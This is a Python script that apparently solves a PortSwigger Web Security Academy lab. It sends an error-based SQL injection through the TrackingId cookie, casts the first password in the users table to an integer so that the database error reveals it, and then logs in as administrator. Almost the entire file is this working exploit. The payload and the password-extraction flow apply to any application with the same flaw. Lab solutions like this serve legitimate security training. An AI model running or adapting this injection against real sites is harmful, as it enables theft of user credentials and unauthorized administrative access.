# usage:
# python3 11.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import http.client
import re
import string
from argparse import ArgumentParser
from typing import Optional

import requests

ALPHANUM = list(string.digits + string.ascii_lowercase)
http.client.HTTPConnection.debuglevel = 1


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        login_url = f"{self.url}/login"
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        s = requests.Session()
        s.get(f"{self.url}/")
        cookies = s.cookies.get_dict()
        cookies["TrackingId"] = (
            "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
        )
        r = s.get(f"{self.url}/", cookies=cookies)
        if r.status_code == 500:
            password = re.findall(r"integer: \"([\w]+)\"", r.text)[0]
        print(f"Password found! -- {password}")
        self.login("administrator", password)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
